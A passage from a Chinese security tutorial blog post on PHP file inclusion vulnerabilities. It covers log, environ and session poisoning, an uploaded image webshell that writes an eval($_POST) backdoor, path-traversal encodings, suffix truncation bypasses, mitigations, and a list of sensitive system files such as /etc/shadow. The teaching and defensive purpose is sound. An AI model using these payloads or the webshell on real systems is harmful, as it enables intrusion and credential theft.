查看日志文件/var/log/auth.log，可以观察到恶意代码已经写入到日志文件</p>
<p><strong>2. 使用文件包含日志文件</strong></p>
<p>测试输入语句：<code>http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log</code><br>
之后再向网页传入POST参数：<code>123=phpinfo</code><br>
就可以出现phpinfo的内容了</p>
<p>参考：[<a target="_blank" rel="noopener" href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/">RCE with LFI and SSH Log Poisoning</a>]</p>
<h3 id="33-包含environ">3.3 包含environ</h3>
<p>利用条件：</p>
<ol>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ol>
<p>姿势：</p>
<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
<p>可以参考这个：</p>
<ol>
<li><a target="_blank" rel="noopener" href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html">The proc/self/environ Injection</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/papers/12886/">shell via LFI - proc/self/environ method</a></li>
</ol>
<h3 id="34-包含fd">3.4 包含fd</h3>
<p>与前面的方法类似<code>/proc/self/environ</code>，可以将代码引入 proc 日志文件中，这些代码可以通过易受攻击的 LFI 脚本执行。通常，您会使用 burp 或 curl 将 PHP 代码注入到<code>referer</code>.</p>
<p>这种方法有点棘手，因为包含 Apache 错误日志信息的 proc 文件在<code>/proc/self/fd/</code>等下发生了变化<code>/proc/self/fd/2</code>。我建议使用 Burp Intruder + FuzzDB 的<a target="_blank" rel="noopener" href="https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt">LFI-FD</a><code>/proc/self/fd/10</code>暴力破解 /proc/self/fd/ 目录的目录结构<a target="_blank" rel="noopener" href="https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt">-Check.txt</a>可能的 proc 文件列表，然后您可以监控返回的页面大小并进行调查。</p>
<p>参考： <a target="_blank" rel="noopener" href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
<h3 id="35-包含session">3.5 包含SESSION</h3>
<p><strong>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</strong></p>
<pre><code class="hljs plaintext">利用条件：
找到Session内的可控变量
Session文件可读写，并且知道存储路径

一般通过以下两种方式获取session的存储位置：

通过phpinfo的信息获取session的存储位置。
通过phpinfo的信息获取session.save_path
通过猜测默认的session存储位置进行尝试
通常Linux中的Session的默认存储位置在/var/lib/php/session目录下</code></pre>
<p><strong>php的session文件的保存路径可以在phpinfo的session.save_path看到。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230321200640758.png" alt="image-20230321200640758"></p>
<pre><code class="hljs plaintext">session常见存储路径：

/var/lib/php/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</code></pre>
<p>参考文章：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道SESSION包含的CTF题</a></p>
<p><strong>示例分析：</strong></p>
<p>session文件包含代码如下</p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$ctfs</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ctfs'</span>];
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>]=<span class="hljs-variable">$ctfs</span></code></pre>
<p>此代码可以通过GET型的ctfs参数传入。PHP代码将会获取的值存入到Session中。<br>
攻击者可以利用ctfs参数将恶意代码写入到session文件中，然后在利用文件包含漏洞包含此session文件，向系统中传递恶意代码。</p>
<p><strong>漏洞分析</strong></p>
<p>上面的代码满足Session文件包含的两个要求</p>
<ul>
<li>PHP代码将会获取ctfs变量的值存入到session中</li>
<li>Session的默认 存储位置是/var/lib/php/session</li>
</ul>
<p>访问URL：<code>http://www.abc.com/xxx/session.php?ctfs=a</code> 会在/var/lib/php/session目录下降ctfs传入的值存储到session中<br>
Session的文件名以sess_开头，后跟Sessionid，Sessionid可以通过开发者模式获取：<br>
单击右键——检查——存储——Cookie——PHPSESSID 就可以找到内容</p>
<p>假设通过开发者模式获取到的sessionid的值为hufh7hsdf392eurh4,所以session的文件名为<code>sess_hufh7hsdf392eurh4</code><br>
在/var/lib/php/session目录下查看此文件，内容为：<strong>username|s:4:“a”</strong></p>
<p><strong>漏洞利用</strong></p>
<p>通过上面的分析，可以得知，向ctfs参数传入的内容会存储到session文件中。<br>
如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到Session文件当中去，然后通过文件包含漏洞执行getshell</p>
<p>例如：访问代码<code>http://www.abc.com/xxx/session.php?ctfs=&lt;?php phpinfo();?&gt;</code>后，会在/var/lib/php/session目录下降ctfs的值写入session文件<br>
session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code>.</p>
<p><strong>攻击步骤</strong></p>
<ul>
<li>将恶意代码写入session文件</li>
<li>攻击者可以通过PHPinfo或者猜测到session存放的位置</li>
<li>通过开发者模式可以获得文件名称</li>
<li>通过本地文件包含漏洞可以解析session文件达到攻击的目的</li>
</ul>
<p>比如：<code>http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2</code></p>
<h3 id="36-包含临时文件">3.6 包含临时文件</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230321200926394.png" alt="image-20230321200926394"></p>
<p><strong>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</strong></p>
<p><strong>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</strong></p>
<p><strong>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](<a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</strong></p>
<p><strong>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup</a></strong></p>
<h3 id="37-包含上传文件">3.7 包含上传文件</h3>
<p><strong>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</strong></p>
<p><strong>图片马的制作方式如下，在cmd控制台下输入：</strong></p>
<pre><code class="hljs plaintext">进入1.jph和2.php的文件目录后，执行：

copy  1.jpg/b+2.php  3.jpg

将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg</code></pre>
<p><strong>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code></strong><br>
<strong>图片代码如下：</strong></p>
<pre><code class="hljs plaintext">&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POST['pass']);?&gt;")?&gt;</code></pre>
<p><strong>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在<code>index.php</code>所在的目录下生成<code>shell.php</code></strong></p>
<h3 id="38-其他包含姿势">3.8 其他包含姿势</h3>
<pre><code class="hljs plaintext">包含SMTP(日志)
包含xss</code></pre>
<h2 id="0x04-绕过方法">0x04 绕过方法</h2>
<h3 id="41-指定前缀绕过">4.1 指定前缀绕过</h3>
<h4 id="411-目录遍历">4.1.1 目录遍历</h4>
<p><strong>使用 …/…/ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=…/…/phpinfo/phpinfo.php</strong><br>
<strong>测试代码如下：</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
	<span class="hljs-comment">//前缀</span>
	<span class="hljs-keyword">include</span> <span class="hljs-string">"/var/www/html/"</span>.<span class="hljs-variable">$file</span>;

	<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p><strong>现在在/var/log目录下有文件flag.txt，则利用…/可以进行目录遍历，比如我们尝试访问：</strong></p>
<pre><code class="hljs plaintext">include.php?file=../../log/flag.txt</code></pre>
<p><strong>则服务器端实际拼接出来的路径为：/var/www/html/…/…/log/test.txt，即 /var/log/flag.txt，从而包含成功。</strong></p>
<h4 id="412-编码绕过">4.1.2 编码绕过</h4>
<p><strong>服务器端常常会对于…/等做一些过滤，可以用一些编码来进行绕过。</strong><br>
<strong>1.利用url编码</strong></p>
<pre><code class="hljs plaintext">../

    %2e%2e%2f
    ..%2f
    %2e%2e/

..\

    %2e%2e%5c
    ..%5c
    %2e%2e\</code></pre>
<p><strong>2.二次编码</strong></p>
<pre><code class="hljs plaintext">../

    %252e%252e%252f
..\

    %252e%252e%255c</code></pre>
<p><strong>3.容器/服务器的编码方式</strong></p>
<pre><code class="hljs plaintext">../

    ..%c0%af
        注：Why does Directory traversal attack %C0%AF work?

    %c0%ae%c0%ae/
    
        注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）
        Apache Tomcat Directory Traversal

..\

    ..%c1%9c</code></pre>
<p>注：那里的超链接是：<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></p>
<h3 id="42-指定后缀绕过">4.2 指定后缀绕过</h3>
<p><strong>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
	<span class="hljs-comment">//后缀</span>
	<span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">".txt"</span>;

	<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<h4 id="421-利用url">4.2.1 利用url</h4>
<p><strong>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。<br>
可参考此文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2c07fbb52b45">URI’s fragment</a></strong></p>
<p><strong>完整url格式：</strong></p>
<pre><code class="hljs plaintext">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></pre>
<pre><code class="hljs plaintext">query(?)

    [访问参数] ?file=http://localhost:8081/phpinfo.php?
    [拼接后]  ?file=http://localhost:8081/phpinfo.php?.txt
    
    上述可能是?截断：
    ?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数而被丢弃，成功读取getshell如下：
    
   空格绕过
  这里也是一样需要使用编码%20进行绕过，不能直接输入空格。
  ?file=http://localhost:8081/phpinfo.php%20.txt
  
  #号绕过：
  ?file=http://localhost:8081/phpinfo.php%23.txt
	注：这里需要对#进行url编码，#的url编码为%23</code></pre>
<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230321203740146.png" alt="image-20230321203740146"></p>
<pre><code class="hljs plaintext">fragment(#)

    [访问参数] ?file=http://localhost:8081/phpinfo.php%23
    [拼接后]  ?file=http://localhost:8081/phpinfo.php#.txt</code></pre>
<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230321203837999.png" alt="image-20230321203837999"></p>
<p><strong>其他绕过方式：</strong></p>
<p>一些常见的特殊字符URL编码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230618164128542.png" alt="image-20230618164128542"></p>
<p>这里可以用burp爆破一遍，看哪个能用</p>
<h4 id="422-利用协议">4.2.2 利用协议</h4>
<p><strong>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</strong></p>
<pre><code class="hljs plaintext">zip://

    [访问参数] ?file=zip://D:\zip.jpg%23phpinfo
    [拼接后]  ?file=zip://D:\zip.jpg#phpinfo.txt

phar://

    [访问参数] ?file=phar://zip.zip/phpinfo
    [拼接后]  ?file=phar://zip.zip/phpinfo.txt</code></pre>
<p><strong>Example：</strong><br>
<em><em>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码<!--?php phpinfo();?-->)）</em><br>
所以分别构造payload为：</em>*</p>
<pre><code class="hljs plaintext">?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo

?file=phar://../../php.zip/phpinfo</code></pre>
<p><strong>对应的结果分别为：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230321204222933.png" alt="image-20230321204222933"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230321204231560.png" alt="image-20230321204231560"></p>
<h4 id="423-长度截断">4.2.3 长度截断</h4>
<pre><code class="hljs plaintext">利用条件：

    php版本&lt;php 5.2.8

原理：

    Windows下目录最大长度为256字节，超出的部分会被丢弃
    Linux下目录最大长度为4096字节，超出的部分会被丢弃。

利用方法：

    只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)</code></pre>
<pre><code class="hljs plaintext">?file=shell.php./././。。省略。。
//指定的后缀的被丢弃，成功包含木马文件</code></pre>
<p><strong>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</strong></p>
<h4 id="424-00截断">4.2.4 %00截断</h4>
<pre><code class="hljs plaintext">HP魔术引导介绍

  当sql句中含有单引号，双引号，反斜杠和NUL时，这时候如果不对这些符号进行转义，写入数据库时就会出错，而魔术引号magic_quotes_gpc()就是对这些符号进行转义以便能把数据正确写入数据库。不过该参数在php.ini文件中修改。
  PHP魔术引号特性已自 PHP5.3.0起废弃并将自PHP5.4.0起移除。也就是说在本实验环境的PHP版本中仍是存在的</code></pre>
<pre><code class="hljs plaintext">在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效
 
利用条件：

    magic_quotes_gpc = Off
    php版本 &lt; php 5.3.4

利用方法：

    直接在文件名的最后加上%00来截断指定的后缀名
      ?file=shell.php%00
//现阶段%00截断不常用</code></pre>
<h4 id="425-点号截断">4.2.5 点号截断</h4>
<pre><code class="hljs plaintext">原理：
    windows系统 点号 长于 256，超出的部分会被丢弃；
    linux系统 点号 长于 4096，超出的部分会被丢弃；
示例：
http://192.168.100.150/test_include/index.php?page=1.png.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................

burp抓包修改即可</code></pre>
<h4 id="426-双写绕过">4.2.6 双写绕过</h4>
<p><strong>当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php"，“…/”，只需</strong><br>
<strong>再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。</strong></p>
<h4 id="427-大小写混合绕过">4.2.7 大小写混合绕过</h4>
<p><strong>如果在文件包含时，服务器对我们传入的参数没有进行严格过滤，比如没没有对大小写进行过滤，我们可以使用大小写混合进行绕过。</strong></p>
<h2 id="0x05-漏洞防护">0x05 漏洞防护</h2>
<p><strong>1、使用str_replace等方法过滤掉危险字符</strong></p>
<p><strong>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</strong></p>
<p><strong>3、php版本升级，防止%00截断</strong></p>
<p><strong>4、对上传的文件进行重命名，防止被读取</strong></p>
<p><strong>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</strong></p>
<p><strong>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</strong></p>
<pre><code class="hljs plaintext">./表示当前位置路径，../表示上一级路径位置，在linux中同样适用。</code></pre>
<pre><code class="hljs plaintext">3）一些常见的敏感信息路径：

Windows系统：

    c:\boot.ini // 查看系统版本
    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
    c:\windows\repair\sam // 存储Windows系统初次安装的密码
    c:\ProgramFiles\mysql\my.ini // MySQL配置
    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
    c:\windows\php.ini // php 配置信息

Linux/Unix系统：

    /etc/passwd // 账户信息
    /etc/shadow // 账户密码文件
    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
    /usr/local/app/php5/lib/php.ini // PHP相关配置
    /etc/httpd/conf/httpd.conf // Apache配置文件
    /etc/my.conf // mysql 配置文件</code></pre></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/')">浅析文件包含</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=浅析文件包含&amp;url=http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/07/qian-xi-xss-lou-dong/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">浅析XSS漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/07/qian-xi-wen-jian-cao-zuo-lou-dong/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">浅析文件操作漏洞</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">文件包含总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 文件包含的概念：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 文件包含的原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 文件包含分类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.3 文件包含函数：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 PHP伪协议：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-phpinput"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-phpfilter"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-zip"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-data%E4%B8%8Ephar"><span class="toc-number">1.2.4.</span> <span class="toc-text">2.4 data:&#x2F;&#x2F;与phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-expect%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.5.</span> <span class="toc-text">2.5 expect:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 特殊文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E5%8C%85%E5%90%ABapache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 包含Apache日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-%E5%8C%85%E5%90%ABssh-log%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 包含SSH log日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-%E5%8C%85%E5%90%ABenviron"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 包含environ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-%E5%8C%85%E5%90%ABfd"><span class="toc-number">1.3.4.</span> <span class="toc-text">3.4 包含fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-%E5%8C%85%E5%90%ABsession"><span class="toc-number">1.3.5.</span> <span class="toc-text">3.5 包含SESSION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36-%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.6.</span> <span class="toc-text">3.6 包含临时文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37-%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.7.</span> <span 